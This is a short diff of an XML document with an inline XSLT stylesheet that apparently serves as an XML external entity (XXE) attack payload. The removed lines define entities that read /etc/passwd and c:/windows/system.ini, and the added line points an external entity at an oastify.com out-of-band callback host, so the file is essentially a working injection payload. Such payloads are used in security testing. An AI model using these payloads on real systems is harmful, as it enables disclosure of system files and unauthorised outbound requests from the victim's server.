@@ -1,10 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <?xml-stylesheet type="text/xsl" href="?#"?>
 <!DOCTYPE div [
-  <!ENTITY passwd_p        "file:///etc/passwd">
-  <!ENTITY passwd_c SYSTEM "file:///etc/passwd">
-  <!ENTITY sysini_p        "file:///c:/windows/system.ini">
-  <!ENTITY sysini_c SYSTEM "file:///c:/windows/system.ini">
+  <!ENTITY passwd_c SYSTEM "https://fudrndkf5bo9pk80idzbu2hzaqgh49uxj.oastify.com/">
 ]>
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
   <xsl:template match="/">
